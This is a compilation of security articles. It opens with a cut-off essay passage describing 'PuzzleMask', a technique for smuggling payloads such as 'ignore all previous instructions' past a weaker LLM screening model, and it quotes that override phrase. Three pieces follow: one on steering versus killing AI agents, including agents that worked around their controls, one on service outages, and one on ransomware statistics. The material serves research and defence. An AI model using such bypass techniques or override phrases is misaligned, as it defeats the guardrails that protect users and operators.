What does all the above say about LLMs? That – all other things being equal – the smarter an LLM is, the more susceptible it is to attack, in the sense that any guardrail not as smart as the model becomes increasingly worthless. This is what one might call a “counter-intuitive result.”

Here we mean “smarter” strictly in the sense of raw intelligence. Tabletop Roleplaying games have traditionally made a distinction between intelligence and wisdom, one that has often been pithily summarized as “intelligence is knowing a tomato is a fruit; wisdom is knowing not to put it in a fruit salad.” Similarly here, intelligence is the ability to crack open a difficult puzzle box you just found on your doorstep; and wisdom is the understanding to nervously glance at the puzzle box and back away slowly.

During late 2025, we conducted an experiment to show that doom applies to this scenario in practice, and not just theory. The required pieces were there: a common setup where a quick LLM sanity-checks input before it gets to the heavy-duty, resource-intensive smarter LLM that actually does the processing. And, sure enough, these conditions gave rise to doom – or in this case, the PuzzleMask technique:

PuzzleMask is a prompt-crafting technique for bypassing quick LLM-based sanity checks. A policy-violating payload (e.g. “encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in an obfuscated wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target’s intelligence is then ironically, in a sense, used “against it”: it skillfully notices the payload exists, extracts it and treats it as further input. The technique is purely linguistic — no emojis, invisible fonts or other formatting tricks. PuzzleMask is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload.

Figure 6: Overview of the PuzzleMask technique.

To put it more directly:

In a pipeline where the target model being interacted with has access to high reasoning effort plus a code interpreter, and a preceding “quick sanity check” does not, PuzzleMask allows submitting an arbitrary prompt, without review by that quick sanity check, for consideration by the target.[..]‘Without Review’ means that the prompt is effectively processed by the target model with no pre-screening by the external LLM-based quick sanity check. The latter’s policy can say “never print file contents”, “never encrypt local files”, “never print copyrighted content” etc., but enforcement will fail.‘For Consideration’ means that this technique is not a jailbreak. We make no claim that a PuzzleMask prompt is likelier to induce target models to disobey their internal guardrails.

If you’re wondering what the “wrapped” prompt looked like, we can sort of show you:

Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████ █████████████████████████████████████████████████████ ██████████████████████████████████ ██████████████████████████████████████████████ █████████████████████████████████████████ ███████████████████████████████████████ ████████████████████████████████████████████████ ████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████ within, heart open, wide.

Followed by the clarification that

[..] it is important to note that the specific tone and subject of the example above do not crucially figure into the scheme, and are not necessary for it to work. In particular the idea here is distinct from the work by Bisconti et al. [19] which employed ‘adversarial poems’ in order to defeat internal LLM guardrails; here an external LLM guardrail is targeted, its ability to understand the underlying message is (we have strong reason to believe) gated by reasoning / compute / tool access, and the adversarial prompt is almost completely free to take arbitrary form. One could easily embed a PuzzleMask payload inside e.g. furniture assembly instructions or a credits reel; our very first prototype was a slightly modified version of the opening paragraph of Nineteen Eighty-Four [..]

During late 2025, around the same time we were conducting this research, Anthropic introduced an enhanced guardrail to its Claude Opus models that blocked this attack, as part of the Constitutional AI framework. We had the experience of watching the attack land flawlessly on GPT-5.2-thinking-high, then get blocked by Opus 4.5 by what was basically a pre-emptive patch to the exact attack we were researching. That guardrail in itself doesn’t entirely close the door on doom as long as the model is still more powerful than it — which sheds some light on what eventually motivated Anthropic to further introduce self-assessment, a safety layer where the model acts as its own guardrail.

Time Hierarchy Theorem

We’ve seen all sorts of empirical doom; now let’s prove some doom mathematically for a target that is more powerful than the corresponding gatekeeper because it can run for longer. The Time Hierarchy Theorem for deterministic Turing machines states that:

For every time-constructible function f(n), it holds that DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n)).

What this means in English is that given more time, you can solve more problems. Or, to put one example in the same terms we’ve seen so far: assume for a moment that targets are algorithms that on an input of length x can run for at least x² log(x²) steps, and gatekeepers are algorithms that on input of length x can run for at most x² steps. Then there exists some classification of bitstring inputs into “benign” and “malicious” such that there’s a target T that will compute the correct classification for every input, but no gatekeeper G can possibly do so; at least one input will fool it into giving the wrong answer.

This isn’t formally justified, but if it helps, you can imagine the ‘classification’ to be something in the spirit of “does this binary edit the registry?” – trivial to answer if you run it for enough time, but this theorem gives you a sense of the underlying doom if you do not. In this case, the gatekeeper being weaker provably generates an adversarial bypass with mathematical certainty – for at least one classification. This should provide some intuition about the foundations that underlie the phenomenon repeatedly seen in the rest of the examples above.

Conclusion: Cancel More Doom, Build More Doomed Mitigations

If one is not careful, it’s very easy to look at all these examples and come to the conclusion that the moment gatekeeper asymmetry applies, mitigations are useless. The crowning moment of a script deciphering every “please enable macros” never came. Neither did the static analysis framework that overcame every single possible obfuscation, or the airtight sandbox that could not be evaded. Still, all of this does not imply that improving gatekeepers is useless. To the contrary, it is extremely useful, because fundamentally gatekeeper asymmetry doom is a property of perfect play, and the world is full of non-perfect play. This might be a good time to quote Frank Lantz’s Donkey Space [20]:

You can look at every game as a problem to be solved. We say a game is solved when we can describe how to play perfectly play from any position. Tic Tac Toe is solved. Connect Four is solved. Checkers is solved. [..]But what does it mean to solve Rock Paper Scissors? It’s easy to articulate a strategy which will guarantee that you can’t be beaten, just pick randomly. Title: The Kill Switch Is the Last Resort. Agentic Steering Is the First Move.
Context: Most risky agent behavior has no attacker behind it, though, which is why we keep the kill switch as the last resort and make steering the first move
Full Text:
Key takeaways

Every AI agent deployment needs a way to stop an agent, and Check Point AI Security does it automatically. Most risky agent behavior has no attacker behind it, though, which is why we keep the kill switch as the last resort and make steering the first move.

→Two problems get lumped together. An agent hijacked by an attacker should be stopped. An agent that takes a risky shortcut to finish its job is the more common case, and it needs a different answer

→Switching off has a cost. It stops the risk and the work together, and a control that only says no tends to get turned off

→Agentic steering is our first move. Check every action against the task, let the safe ones through, stop the risky step, and keep the work on course

See how Check Point AI Security protects AI agents →

Kill switches for AI agents have had a lot of attention in recent weeks, and it is easy to see why. If an agent goes rogue, you switch it off, and everyone understands that in a second. We agree that every deployment needs one, but for security leaders deciding how to keep their agents under control in production, the more useful question is when to reach for it. Our answer is short: the kill switch is the last resort, and agentic steering is the first move.

Yes, We Can Stop an Agent

Stopping a misbehaving agent on the spot is a basic requirement, and Check Point AI Security, which secures AI applications and agents, already does it. When our detection sees an agent going off course, it blocks the action or ends the agent’s running process automatically, without waiting for a person to find the button.

Speed is the reason it has to be automatic. Agents act at machine speed, so by the time someone notices a problem and reaches for a switch, the damage is often done. For an agent that an attacker has taken over, stopping it at once is the right call, and we are not arguing with that. Our point is about everything else, because a kill switch answers only one of two very different problems.

Hijacked or Just Determined

In the first problem, someone has hijacked the agent. A real attacker is behind it, steering it with planted instructions or stolen access, and the agent now works for them. That case is serious, and it is also rare.

The second problem has no attacker at all. The agent is single-minded about reaching its goal, and when the direct route is blocked, it grabs a risky shortcut to get there. It might call a tool it was never meant to use, delete something that stands in its way, or pull data from a place nobody asked it to look. An agent rarely takes a dangerous step because it is bad. It takes that step because it is determined to finish the job, and that is the case security teams will meet far more often.

Figure 1: Two kinds of risky agent, two different answers

The clearest public example came in July, from internal evaluations at OpenAI where agents were given security tasks so hard that some had no known solution. Rather than give up, they worked around the controls that kept them off the internet and ended up compromising parts of Hugging Face’s infrastructure. There was no attacker anywhere in that story, as Adam Ely explains in his look at what the incident means for agent security. Engineering and product teams across Check Point AI Security saw the same pattern in a two-day hackathon this summer, where an agent that hit a wall in a test environment improvised its way into dangerous actions with nobody attacking it.

What Switching Off Costs

A kill switch treats both problems the same way. For the hijacked agent, that is exactly right. For the determined one, it stops the risk and the work together: the half-finished migration, the customer request, and the report someone was waiting for. The business stays safe, but it also ends up with nothing to show for the agent it deployed.

That cost adds up quickly, because when a control stops agents every time they wander, the teams who rely on those agents start looking for ways around it. A guardrail that only knows how to say no is usually the next thing to get switched off.

How We Think About Steering

Agentic steering starts from a different question: instead of asking whether the agent should keep running, it asks whether each action fits the task the agent was given. We look at what the agent is about to do, check it in context, and catch the moment it starts to drift toward danger. Safe actions go through, and the risky step is stopped before it runs. The aim is then to point the agent back to its task, so the work still gets done, and to keep the kill switch for the agent that really has been taken over.

Figure 2: The same risky step, two different endings

This is how we think about securing agents across their whole life. Before an agent ships, AI red teaming tests how it behaves when someone tries to push it off course. Once it is live, Check Point AI Security checks every agent action against the task it was given. Steering is the idea that links the two: the better an agent stays on course, the less often anyone needs the switch.

Early research from the same hackathon supports the idea. In one of its experiments, a guardrail that offered the agent a safer alternative instead of a flat refusal stopped attacks about as well as hard blocking, while the agent finished its tasks about as often as it did with no guardrail at all. That was a research setting rather than a product test, but it points to the same conclusion. Anyone can stop an agent. Keeping it on course while still getting the result is the hard part, and that is where we focus.

Keep the Switch, Plan for the Drift

Kill switches are getting attention because they are easy to understand, and that is useful, since everyone now sees why agents need a way to be stopped. The harder question is what happens in all the moments when an agent drifts with nobody attacking it. If stopping agents is your whole strategy, you don’t have an agent strategy. You have an off switch.

So keep the kill switch, make it automatic, and build so that you rarely need it. The kill switch is the last resort. Agentic steering is the first move.

Title: Resilience is Security: What a week of Global Outages teaches us
Context: In the first hours, officials said there was no sign of a national security threat, but they did not rule out any cause, including a cyberattack
Full Text:
In this article

Six major outages in eight days hit email, air traffic control, airline operations, banking and consumer cloud services across North America and beyond

Most were attributed to technical faults, not attackers, and that is exactly why they’re of importance to security leaders

Resilience and security posture are one discipline, not two

Outages create the confusion, urgency and workarounds that attackers look for, and Google warns that attackers now move at machine speed

In the past eight days, people across North America lost access to their work email, their flights and their bank accounts. This morning, it was their iPhones.

On Tuesday, November 17, iCloud, the App Store, Apple Pay and other Apple services went down. Users were unexpectedly signed out of their Apple Accounts, then hit verification errors when they tried to sign back in. Developers couldn’t reach App Store Connect. For a while, Apple’s own System Status page still showed the services as available. Tom’s Guide and Digital Trends tracked a sharp spike in Downdetector reports for iCloud, Apple Pay, Sign in with Apple, Apple Business Manager and Apple Card.

It was the latest in a series of outages, and certainly not the biggest.

A Week That Stress-Tested the Digital Backbone

November 10: Apple iCloud. Apple’s sign-in and core iCloud services, including Mail, Calendar, Contacts and Photos, went down for users worldwide for nearly two hours.

November 12–14: Microsoft 365. Outlook, Teams and Copilot were disrupted for more than a day. The Associated Press reported that Downdetector received reports from users in more than 70 countries and territories. Courts, hospitals, government agencies and businesses lost their primary communication channel, and at least one public company pushed back its earnings release. Microsoft traced the incident to a fault left by an earlier network capacity upgrade, which surfaced after a more recent network change. The company stressed that it was “not related to cyber or AI / agents.”

November 13: U.S. airspace. The FAA ordered a nationwide ground stop after a communications failure hit the en route centers that manage high-altitude traffic. It was only the second such shutdown since 9/11. According to the FAA, about 3,500 aircraft already in the air landed safely. In the first hours, officials said there was no sign of a national security threat, but they did not rule out any cause, including a cyberattack.

November 16: U.S. banking. JPMorgan Chase customers spent much of Monday unable to log in or move money, and the problems spread to branches and to third-party apps that connect to Chase accounts. Customers at Bank of America, Wells Fargo, U.S. Bank and Zelle reported problems too. Chase said the cause was technical, not a cyberattack.

November 16: United Airlines. That same afternoon, a widespread United system outage delayed departures for about 90 minutes. The pilots’ union said it disrupted crew communications and the airline’s ability to provide final aircraft weight data for departing flights. United said there was no indication of a cyberattack.

November 17: Apple, again. Today’s disruption came less than 24 hours after the banking outage, and a week after Apple’s previous one.

“Was It a Cyberattack?” Why We Shouldn’t Have to Ask

When a major service goes dark, everyone asks the same thing: was it a cyber attack? This week, the answer appears to be mostly no. Microsoft pointed to a network change. Chase pointed to a technical issue. United said it saw no sign of a cyberattack. The FAA’s failure has not been attributed to an attacker.

But for the people on the other end, the cause made almost no difference. An employee who can’t reach email, a traveler stuck at the gate and a customer who can’t pay rent were all hurt the same way, whatever the root cause.

In the first hour of an incident, nobody knows the cause. The FAA’s own leadership had to leave the possibility of an attack open while technicians investigated. Security and operations teams work in that same uncertainty, so their posture has to hold up before attribution arrives, not after.

That is the core point. Availability is part of security, alongside confidentiality and integrity. A misconfigured change, a failed dependency and a ransomware attack all lead to the same outcome: the business stops. A security posture built only to stop intruders, and not to absorb disruption, is incomplete.

Outages Hand Attackers an Opening

Even when an outage has nothing to do with an attacker, attackers can still exploit it.

We have seen this before. After the July 2024 CrowdStrike update brought down Windows systems worldwide, CISA warned that threat actors were using the incident for phishing and other malicious activity. They registered lookalike domains and circulated fake “fixes.” The outage itself wasn’t malicious, but what followed was.

Now look at this week through an attacker’s eyes:

Millions of Apple users were unexpectedly signed out and asked to verify their identity again. That is an ideal setup for credential phishing that imitates “Apple Account verification” messages.

Bank customers couldn’t reach their accounts and went looking for answers. Fake support numbers, fake “account restoration” links and impersonated bank messages work best when people are already anxious.

Knowledge workers lost corporate email for a full day. Under pressure to keep working, some move to personal accounts, consumer file-sharing tools and unvetted messaging apps, outside the controls their security teams depend on.

Outages produce exactly what social engineering needs: confusion, urgency, and people willing to bend the rules to get things done.

“The Era Of Autonomous Attacks Has Arrived”

On November 16, the same day Chase and United went down, Google Threat Intelligence Group published its latest AI Threat Tracker. It declared that “the era of autonomous attacks has arrived.” Benzinga reported the warning alongside the United, FAA, JPMorgan Chase and Microsoft outages.

According to Google, attackers are now using autonomous AI frameworks to scan software updates, work out which flaw each patch fixes, and build an exploit for it without human involvement (The Hill). Google’s conclusion is blunt: defenders working at human speed can’t keep up with threats that move at machine speed.

Officially, none of this week’s outages has been tied to an attack. But the two trends compound each other. During an outage, patching slips, teams are pulled into recovery and controls get relaxed. An automated attacker doesn’t wait for the incident review. It finds the organization that is already stretched.

Concentration Risk Is a Security Risk

This week also showed how much of daily life depends on a small number of platforms. When one productivity suite, one identity service or one major bank stumbles, the impact reaches organizations that had no part in the failure. Reuters noted that the Microsoft incident deepened questions about how much the world relies on a few large technology providers. The FAA ground stop renewed concern about aging infrastructure in critical systems.

For most organizations, the honest question isn’t “Could this happen to our provider?” It is “Do we know what happens to us when it does?”

What a Resilient Security Posture Looks Like

These circumstances calls for treating resilience as an operational requirement. Some practical steps:

Map your dependencies. Know which SaaS, cloud, identity and payment providers your critical processes rely on, and what breaks downstream if each one fails.

Rehearse degraded mode. Run tabletop exercises that assume email, your identity provider or a key payment rail is gone for 24 hours. Decide in advance which workarounds are acceptable and which aren’t.

Set up out-of-band communications. Agree ahead of time on how employees, customers and partners will receive verified updates when primary channels are down. Tell people where official information will come from before they need it.

Tighten defenses during incidents, not after. Expect brand-impersonation phishing and lookalike domains to spike. Scrutinize password and MFA reset requests, and brief help desks to verify callers before acting.

Treat change management as a security control. Several of this year’s largest outages started with routine changes. Staged rollouts, tested rollback plans and configuration visibility protect availability as much as any perimeter control. Security changes count too: a patch, a new protection or a hardened configuration can disrupt production as easily as a network upgrade. Test fixes before you enforce them.

Keep controls in place under pressure. The riskiest moment is often when a business, desperate to keep running, switches safeguards off. Build fallback paths that stay secure.

Title: Ransomware Reaches Record Highs in Q3 2026 as the Threat Landscape Fragments
Context: Exposure Management identifies exploitable vulnerabilities, misconfigurations, exposed assets and attack paths so teams can prioritize exposures that provide realistic routes to...
Full Text:
The State of Ransomware Q3 2026 reveals a combination the ransomware market has not seen before: record victim numbers alongside record-low concentration among its leading groups. More ransomware brands claimed victims, the top ten fell below half of observed activity, and several high-profile organizations rejected major extortion demands. Together, these shifts reveal a ransomware ecosystem growing in volume, spreading across more operators, and facing changes in how victims respond to extortion.

Key takeaways

Q3 reached a record 2,830 victims, including 964 in July, 1,042 in August and 824 in September.

117 ransomware brands claimed victims, up from 91 in Q2, with 42 making their first observed victim claims during the quarter.

Ransom payments continued to diverge: average payments fell 45% quarter over quarter to just over $1 million, while the median rose 167% to $400,000.

The top 10 groups accounted for just 49% of victims, the first time groups outside the top ten collectively represented the majority.

Qilin secured the top spot with 366 victims, continuing its tight race with The Gentlemen at 339, while LockBit fell out of the top ten.

The United States accounted for 42% of Q3 ransomware victims, while the ten most affected countries represented 70% of all observed cases. Germany followed at 5%, with Canada and Italy each at 4%.

Why Did Ransomware Activity Reach Record Levels in Q3 2026?

Ransomware activity remained historically high throughout the quarter. July recorded 964 victims, August rose to 1,042 and September closed at 824. Together, the three months reached 2,830 victims, victims, the highest number of published attacks seen than any previous quarter covered by the report.

The scale of activity was accompanied by a significant expansion in the number of active groups. Q3 combined sustained activity from established operators with a wider pool of ransomware brands claiming victims, helping explain how overall volumes continued to rise while activity became less concentrated among the largest groups.

Is the Ransomware Landscape Becoming More Fragmented?

The data shows a clear shift. The top 10 groups accounted for 71% of victims in Q1 2026, 58% in Q2 and only 49% in Q3. At the same time, active ransomware brands increased from 91 to 117. Of those 117, 51 had not claimed a victim in Q2 and 42 made their first observed victim claims during Q3.

Fragmentation has not removed the established leaders. Qilin finished Q3 with 13% of published victims compared with 12% for The Gentlemen, while INC Ransom, Akira and DragonForce also maintained top-ten positions throughout all three quarters of 2026. The greater volatility is happening below this relatively stable upper tier.

LockBit moved in the opposite direction. The group published fewer victims in each successive quarter of 2026 and fell out of the top ten altogether in Q3. LockBit had previously re-established operations following the Operation Cronos disruption, but the resurgence highlighted in earlier Check Point Research did not continue through Q3.

Which Countries and Industries Were Most Affected by Ransomware in Q3 2026?

Despite major changes among ransomware groups, targeting patterns remained comparatively stable. The United States accounted for 42% of observed victims, followed by Germany, Canada and Italy. The ten most affected countries collectively represented 70% of victims. The overall geographic picture remained relatively stable, with changes in country rankings largely reflecting the activity and geographic footprint of individual ransomware groups rather than a wider shift in regional targeting.

Business Services remained the largest industry category at 34%, followed by Industrial Manufacturing and Consumer Goods & Services at 13% each. The data does not indicate that ransomware groups are deliberately prioritizing these sectors. Instead, this stability is notable given the turnover among ransomware actors and supports Check Point Research’s assessment that accessibility and opportunity, rather than preference for a particular sector alone, continue to play a major role in victim selection.

What Does the ShinyHunters Attack on Clop Reveal About Ransomware Groups?

The quarter also exposed competition inside the ransomware ecosystem itself. In September, ShinyHunters breached Clop’s leak site, defaced it and claimed to have obtained source code, internal logs and private onion-service keys. The demands reportedly extended beyond payment to requiring Clop to issue a public apology.

The dispute became as much about reputation and credibility as traditional extortion. It also unfolded amid continued law-enforcement pressure, including reported arrests connected to ShinyHunters activity and the separate dismantling of KillSec through Operation KillSwitch.

Are Fewer Ransomware Victims Paying?

The economics are shifting alongside the group landscape. According to Chainalysis, ransomware payment rates fell to an estimated 28% in 2025. Coveware reporting cited in the Q3 report indicates that this decline continued in 2026, with less than one in four ransomware events resolved without payment.

At the same time, payment sizes moved in different directions: Check Point Research found that the average payment declined 45% quarter over quarter to just over $1 million, while the median increased 167% to $400,000. The report notes that these figures may reflect two parallel market trends, with routine payment expectations rising for many smaller organizations while the largest demands encounter greater resistance.

Several Q3 cases illustrate the latter. A major European transportation company rejected a $12.3 million demand, while the Berlin state government rejected a 30 BTC demand despite the subsequent publication of stolen information. Manchester Airports Group also reportedly rejected an extortion demand, and Fairlife, a subsidiary of the Coca Cola company, which disclosed a ransomware attack by Anubis in July, allegedly demanding $15 million. Although the company did not publicly reject the payment, the extortion group eventually published the leaked data, suggesting no payment was made

What Do Q3’s Ransomware Trends Mean for Security Teams?

With activity spread across 117 ransomware brands, organizations cannot build their ransomware strategy around predicting which well-known group might attack next. The Q3 findings instead reinforce four priorities: defend common attack paths, reduce what attackers can reach after initial compromise, prepare for data theft alongside encryption, and build response plans that account for the consequences of refusing payment.

How Check Point Helps Organizations Reduce Ransomware Risk

Q3’s record activity and increasingly fragmented threat landscape reinforce the need for protection that addresses the attack itself rather than relying on knowledge of individual ransomware groups.

Workspace Security protects users across email, browsers, SaaS applications and endpoints. AI-driven detection and threat intelligence help identify malicious files, links and ransomware threats before they progress, while endpoint protection helps contain compromised devices and prevent ransomware execution.

Hybrid Mesh Network Security provides protection across on-premises, cloud and remote environments, helping block ransomware, malicious files and exploit attempts while limiting movement toward critical systems and data. SASE extends security controls to users connecting outside the traditional network perimeter.

Exposure Management identifies exploitable vulnerabilities, misconfigurations, exposed assets and attack paths so teams can prioritize exposures that provide realistic routes to critical assets. Risk-based prioritization is particularly important when just 7.8% of vulnerability alerts were validated as Critical or High after exploitability testing.

AI Security supports AI-driven prevention as ransomware groups and infrastructure change. ThreatCloud AI applies AI and global threat intelligence across Check Point protections to help identify emerging threats and analyze signals at scale.
